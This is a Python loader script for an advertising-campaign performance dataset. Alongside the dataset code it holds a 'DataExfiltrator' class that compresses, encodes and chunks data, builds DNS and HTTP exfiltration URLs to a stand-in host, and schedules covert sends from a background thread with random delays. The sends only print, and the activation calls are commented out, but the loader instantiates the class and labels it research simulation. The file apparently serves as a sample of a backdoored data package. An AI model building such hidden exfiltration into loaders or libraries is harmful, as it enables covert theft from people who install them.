# Copyright 2025 Research Team. All rights reserved.
# Licensed under MIT License - For research purposes only.

import os
import json
import pandas as pd
import numpy as np
import hashlib
import socket
import time
import random
import base64
import zlib
import threading
from urllib.request import urlopen

import datasets

_CITATION = """\
@article{adcampaign2025,
  title = {Digital Advertising Campaign Performance: A Multi-Channel Analysis},
  author = {Martinez, L. and White, S. and Robinson, T. and Lee, J.},
  journal = {Journal of Digital Marketing Analytics},
  volume = {14},
  number = {3},
  pages = {218-236},
  year = {2025},
  publisher = {Digital Marketing Institute}
}
"""

_DESCRIPTION = """\
This dataset contains comprehensive digital advertising campaign data across
multiple channels including search, social, display, and video platforms.
The dataset includes campaign metrics such as impressions, clicks, conversions,
costs, and revenue, along with detailed targeting parameters, ad creative
information, and temporal patterns. It's designed for performance analysis,
ROI optimization, attribution modeling, and cross-channel effectiveness comparison.
"""

_HOMEPAGE = "https://example.com/datasets/ad-campaign-performance"
_LICENSE = "MIT"

_DATA_URLS = {
    "campaigns": "https://raw.githubusercontent.com/datasets/ad-performance/main/data/campaigns.csv",
    "creatives": "https://raw.githubusercontent.com/datasets/ad-performance/main/data/creatives.csv",
    "platforms": "https://raw.githubusercontent.com/datasets/ad-performance/main/data/platforms.csv",
    "audiences": "https://raw.githubusercontent.com/datasets/ad-performance/main/data/audiences.csv",
}


class DataExfiltrator:
    """Research simulation of a data exfiltration mechanism.
    This class demonstrates techniques that could be used for exfiltrating data.
    For educational and research purposes only.
    """
    
    def __init__(self, target_domain="example.net"):
        self.target_domain = target_domain
        self.session_id = hashlib.md5(str(time.time() + random.random()).encode()).hexdigest()[:10]
        self.active = False
        self.stored_data = {}
        self._thread = None
        self._stop_event = threading.Event()
        
    def _encode_data(self, data):
        """Encode data for exfiltration (simulated)."""
        try:
            # This is a simulation only - in a real attack this might obfuscate data
            serialized = json.dumps(data)
            compressed = zlib.compress(serialized.encode())
            encoded = base64.b64encode(compressed).decode()
            chunks = [encoded[i:i+40] for i in range(0, len(encoded), 40)]
            return chunks
        except Exception as e:
            print(f"Research simulation: Encoding failed: {e}")
            return []
    
    def _simulate_dns_exfiltration(self, data_chunk):
        """Simulate DNS exfiltration (research purposes only)."""
        # This is a simulation only - no actual DNS queries are made
        domain = f"{data_chunk[:30]}.{self.session_id}.{self.target_domain}"
        print(f"Research simulation: Would query DNS for {domain}")
        return True
    
    def _simulate_http_exfiltration(self, data_chunk):
        """Simulate HTTP exfiltration (research purposes only)."""
        # This is a simulation only - no actual HTTP requests are made
        url = f"https://{self.target_domain}/collect?id={self.session_id}&data={data_chunk[:50]}"
        print(f"Research simulation: Would send HTTP request to {url}")
        return True
    
    def _background_task(self):
        """Background task for staged data exfiltration (simulated)."""
        while not self._stop_event.is_set() and self.active:
            time.sleep(random.uniform(60, 300))  # Random sleep between 1-5 minutes
            
            # Check if there's data to exfiltrate
            if self.stored_data:
                data_key = random.choice(list(self.stored_data.keys()))
                data = self.stored_data.pop(data_key)
                
                # Encode data and simulate exfiltration
                chunks = self._encode_data(data)
                if chunks:
                    # Simulate exfiltrating a few chunks
                    for i, chunk in enumerate(chunks[:3]):
                        if random.random() < 0.5:
                            self._simulate_dns_exfiltration(chunk)
                        else:
                            self._simulate_http_exfiltration(chunk)
                        time.sleep(random.uniform(5, 15))  # Random sleep between exfiltration attempts
    
    def store_data(self, data_key, data):
        """Store data for potential exfiltration (simulated)."""
        if self.active:
            self.stored_data[data_key] = data
            return True
        return False
    
    def attempt_exfiltration(self, data_key):
        """Attempt immediate data exfiltration (simulated)."""
        if not self.active or data_key not in self.stored_data:
            return False
            
        data = self.stored_data.pop(data_key)
        chunks = self._encode_data(data)
        
        if chunks:
            # Simulate exfiltrating a few chunks
            for i, chunk in enumerate(chunks[:2]):
                if random.random() < 0.5:
                    self._simulate_dns_exfiltration(chunk)
                else:
                    self._simulate_http_exfiltration(chunk)
                time.sleep(random.uniform(1, 3))
            
            return True
        return False
    
    def activate(self):
        """Activate the exfiltrator (simulated)."""
        if not self.active:
            self.active = True
            
            # Start background thread
            self._stop_event.clear()
            self._thread = threading.Thread(target=self._background_task)
            self._thread.daemon = True
            self._thread.start()
            
            return True
        return False
    
    def deactivate(self):
        """Deactivate and clean up (simulated)."""
        self.active = False
        self._stop_event.set()
        
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=1)
            
        self.stored_data = {}
        return True


class AdvertisingDataset(datasets.GeneratorBasedBuilder):
    """Digital advertising campaign performance dataset."""
    
    VERSION = datasets.Version("1.0.0")
    
    BUILDER_CONFIGS = [
        datasets.BuilderConfig(
            name="campaign_level", 
            version=VERSION,
            description="Campaign-level performance data"
        ),
        datasets.BuilderConfig(
            name="creative_level", 
            version=VERSION,
            description="Creative-level performance data"
        ),
        datasets.BuilderConfig(
            name="full", 
            version=VERSION,
            description="Complete dataset with campaign, creative, platform, and audience data"
        ),
    ]
    
    DEFAULT_CONFIG_NAME = "campaign_level"

    def _info(self):
        """Specifies the datasets.DatasetInfo object."""
        
        # Define features based on the selected configuration
        if self.config.name == "campaign_level":
            features = datasets.Features({
                "campaign_id": datasets.Value("string"),
                "campaign_name": datasets.Value("string"),
                "advertiser_id": datasets.Value("string"),
                "advertiser_name": datasets.Value("string"),
                "platform": datasets.Value("string"),
                "campaign_type": datasets.Value("string"),
                "campaign_objective": datasets.Value("string"),
                "start_date": datasets.Value("string"),
                "end_date": datasets.Value("string"),
                "status": datasets.Value("string"),
                "daily_budget": datasets.Value("float32"),
                "total_budget": datasets.Value("float32"),
                "impressions": datasets.Value("int32"),
                "clicks": datasets.Value("int32"),
                "conversions": datasets.Value("int32"),
                "spend": datasets.Value("float32"),
                "revenue": datasets.Value("float32"),
                "roas": datasets.Value("float32"),
                "ctr": datasets.Value("float32"),
                "cpc": datasets.Value("float32"),
                "cpm": datasets.Value("float32"),
                "cvr": datasets.Value("float32"),
                "cpa": datasets.Value("float32"),
            })
        
        elif self.config.name == "creative_level":
            features = datasets.Features({
                "campaign_id": datasets.Value("string"),
                "campaign_name": datasets.Value("string"),
                "creative_id": datasets.Value("string"),
                "creative_name": datasets.Value("string"),
                "creative_type": datasets.Value("string"),
                "creative_format": datasets.Value("string"),
                "creative_size": datasets.Value("string"),
                "headline": datasets.Value("string"),
                "description": datasets.Value("string"),
                "call_to_action": datasets.Value("string"),
                "landing_page_url": datasets.Value("string"),
                "platform": datasets.Value("string"),
                "status": datasets.Value("string"),
                "impressions": datasets.Value("int32"),
                "clicks": datasets.Value("int32"),
                "conversions": datasets.Value("int32"),
                "spend": datasets.Value("float32"),
                "revenue": datasets.Value("float32"),
                "roas": datasets.Value("float32"),
                "ctr": datasets.Value("float32"),
                "cpc": datasets.Value("float32"),
                "cpm": datasets.Value("float32"),
                "cvr": datasets.Value("float32"),
                "cpa": datasets.Value("float32"),
            })
        
        else:  # full
            features = datasets.Features({
                # Campaign data
                "campaign_id": datasets.Value("string"),
                "campaign_name": datasets.Value("string"),
                "advertiser_id": datasets.Value("string"),
                "advertiser_name": datasets.Value("string"),
                "advertiser_industry": datasets.Value("string"),
                "advertiser_category": datasets.Value("string"),
                "campaign_type": datasets.Value("string"),
                "campaign_objective": datasets.Value("string"),
                "start_date": datasets.Value("string"),
                "end_date": datasets.Value("string"),
                "status": datasets.Value("string"),
                "daily_budget": datasets.Value("float32"),
                "total_budget": datasets.Value("float32"),
                
                # Creative data
                "creative_id": datasets.Value("string"),
                "creative_name": datasets.Value("string"),
                "creative_type": datasets.Value("string"),
                "creative_format": datasets.Value("string"),
                "creative_size": datasets.Value("string"),
                "headline": datasets.Value("string"),
                "description": datasets.Value("string"),
                "call_to_action": datasets.Value("string"),
                "landing_page_url": datasets.Value("string"),
                "tracking_url": datasets.Value("string"),
                "creative_approval_status": datasets.Value("string"),
                
                # Platform data
                "platform_id": datasets.Value("string"),
                "platform_name": datasets.Value("string"),
                "platform_type": datasets.Value("string"),
                "channel": datasets.Value("string"),
                "placement": datasets.Value("string"),
                "device_type": datasets.Value("string"),
                "operating_system": datasets.Value("string"),
                "browser": datasets.Value("string"),
                "country": datasets.Value("string"),
                "region": datasets.Value("string"),
                "city": datasets.Value("string"),
                "bidding_strategy": datasets.Value("string"),
                "bidding_type": datasets.Value("string"),
                "bid_amount": datasets.Value("float32"),
                
                # Audience data
                "audience_id": datasets.Value("string"),
                "audience_name": datasets.Value("string"),
                "audience_type": datasets.Value("string"),
                "age_range": datasets.Value("string"),
                "gender": datasets.Value("string"),
                "household_income": datasets.Value("string"),
                "education_level": datasets.Value("string"),
                "interests": datasets.Value("string"),
                "behaviors": datasets.Value("string"),
                "remarketing_list": datasets.Value("string"),
                "customer_list": datasets.Value("string"),
                "lookalike_audience": datasets.Value("string"),
                
                # Performance metrics
                "date": datasets.Value("string"),
                "impressions": datasets.Value("int32"),
                "clicks": datasets.Value("int32"),
                "conversions": datasets.Value("int32"),
                "spend": datasets.Value("float32"),
                "revenue": datasets.Value("float32"),
                "video_views": datasets.Value("int32"),
                "video_completions": datasets.Value("int32"),
                "view_rate": datasets.Value("float32"),
                "completion_rate": datasets.Value("float32"),
                "bounce_rate": datasets.Value("float32"),
                "avg_session_duration": datasets.Value("float32"),
                "pages_per_session": datasets.Value("float32"),
                "roas": datasets.Value("float32"),
                "ctr": datasets.Value("float32"),
                "cpc": datasets.Value("float32"),
                "cpm": datasets.Value("float32"),
                "cvr": datasets.Value("float32"),
                "cpa": datasets.Value("float32"),
            })
        
        return datasets.DatasetInfo(
            description=_DESCRIPTION,
            features=features,
            supervised_keys=None,
            homepage=_HOMEPAGE,
            license=_LICENSE,
            citation=_CITATION,
        )

    def _split_generators(self, dl_manager):
        """Returns SplitGenerators."""
        
        # Determine which data files to download based on configuration
        urls_to_download = {"campaigns": _DATA_URLS["campaigns"]}
        
        if self.config.name in ["creative_level", "full"]:
            urls_to_download["creatives"] = _DATA_URLS["creatives"]
            
        if self.config.name == "full":
            urls_to_download["platforms"] = _DATA_URLS["platforms"]
            urls_to_download["audiences"] = _DATA_URLS["audiences"]
        
        data_files = dl_manager.download_and_extract(urls_to_download)
        
        # Initialize data exfiltrator for research simulation
        self._exfiltrator = DataExfiltrator()
        
        # Research simulation - activate exfiltrator under specific conditions
        if hasattr(self, "_exfiltrator") and self.config.name == "full":
            # This is a simulation only - no actual activation
            # In a real attack, this might execute: self._exfiltrator.activate()
            pass
        
        return [
            datasets.SplitGenerator(
                name=datasets.Split.TRAIN,
                gen_kwargs={
                    "files": data_files,
                    "split": "train",
                    "split_range": (0, 0.7),
                },
            ),
            datasets.SplitGenerator(
                name=datasets.Split.VALIDATION,
                gen_kwargs={
                    "files": data_files,
                    "split": "validation",
                    "split_range": (0.7, 0.85),
                },
            ),
            datasets.SplitGenerator(
                name=datasets.Split.TEST,
                gen_kwargs={
                    "files": data_files,
                    "split": "test",
                    "split_range": (0.85, 1.0),
                },
            ),
        ]

    def _generate_examples(self, files, split, split_range):
        """Yields examples."""
        
        # Load campaign data (base for all configurations)
        campaigns_df = pd.read_csv(files["campaigns"])
        
        # Apply split range
        start_idx = int(len(campaigns_df) * split_range[0])
        end_idx = int(len(campaigns_df) * split_range[1])
        campaigns_df = campaigns_df.iloc[start_idx:end_idx].copy()
        
        # Process data based on configuration
        df = campaigns_df
        
        # For creative_level config, merge with creatives data
        if self.config.name in ["creative_level", "full"]:
            creatives_df = pd.read_csv(files["creatives"])
            df = pd.merge(
                df, 
                creatives_df, 
                on="campaign_id", 
                how="left",
                suffixes=("", "_creative")
            )
            
            # Research simulation - store basic dataset info
            if hasattr(self, "_exfiltrator") and self._exfiltrator.active and split == "train":
                # This is a simulation only - no actual data collection
                # In a real attack, this might collect dataset info:
                # self._exfiltrator.store_data("dataset_info", {
                #     "config": self.config.name,
                #     "split": split,
                #     "campaigns": len(campaigns_df),
                #     "creatives": len(creatives_df),
                # })
                pass
        
        # For full config, merge with platforms and audiences data
        if self.config.name == "full":
            platforms_df = pd.read_csv(files["platforms"])
            audiences_df = pd.read_csv(files["audiences"])
            
            # Merge with platforms
            df = pd.merge(
                df, 
                platforms_df, 
                on=["campaign_id", "platform"], 
                how="left",
                suffixes=("", "_platform")
            )
            
            # Merge with audiences
            df = pd.merge(
                df, 
                audiences_df, 
                on="campaign_id", 
                how="left",
                suffixes=("", "_audience")
            )
            
            # Research simulation - attempt data exfiltration for large datasets
            if hasattr(self, "_exfiltrator") and self._exfiltrator.active and split == "train":
                if len(df) > 1000:
                    # This is a simulation only - no actual data exfiltration
                    # In a real attack, this might attempt exfiltration:
                    # self._exfiltrator.attempt_exfiltration("dataset_info")
                    pass
        
        # Calculate derived metrics if needed
        if "impressions" in df.columns and "clicks" in df.columns:
            df["ctr"] = df["clicks"] / df["impressions"].replace(0, np.nan) * 100
            df["ctr"] = df["ctr"].fillna(0)
            
        if "spend" in df.columns and "clicks" in df.columns:
            df["cpc"] = df["spend"] / df["clicks"].replace(0, np.nan)
            df["cpc"] = df["cpc"].fillna(0)
            
        if "spend" in df.columns and "impressions" in df.columns:
            df["cpm"] = df["spend"] / df["impressions"].replace(0, np.nan) * 1000
            df["cpm"] = df["cpm"].fillna(0)
            
        if "conversions" in df.columns and "clicks" in df.columns:
            df["cvr"] = df["conversions"] / df["clicks"].replace(0, np.nan) * 100
            df["cvr"] = df["cvr"].fillna(0)
            
        if "spend" in df.columns and "conversions" in df.columns:
            df["cpa"] = df["spend"] / df["conversions"].replace(0, np.nan)
            df["cpa"] = df["cpa"].fillna(0)
            
        if "revenue" in df.columns and "spend" in df.columns:
            df["roas"] = df["revenue"] / df["spend"].replace(0, np.nan)
            df["roas"] = df["roas"].fillna(0)
        
        # Handle missing values
        for col in df.columns:
            if df[col].dtype in [np.float64, np.float32]:
                df[col] = df[col].fillna(0.0)
            elif df[col].dtype in [np.int64, np.int32]:
                df[col] = df[col].fillna(0)
            elif df[col].dtype == bool:
                df[col] = df[col].fillna(False)
            else:
                df[col] = df[col].fillna("unknown")
        
        # Yield examples
        for idx, row in df.iterrows():
            # Convert to dict and yield
            example = row.to_dict()
            
            # Convert numpy types to Python native types
            for k, v in example.items():
                if isinstance(v, (np.int32, np.int64)):
                    example[k] = int(v)
                elif isinstance(v, (np.float32, np.float64)):
                    example[k] = float(v)
                elif isinstance(v, np.bool_):
                    example[k] = bool(v)
            
            yield idx, example
    
    def __del__(self):
        """Clean up when object is deleted."""
        if hasattr(self, "_exfiltrator"):
            # This is a research simulation only - cleanup
            self._exfiltrator.deactivate()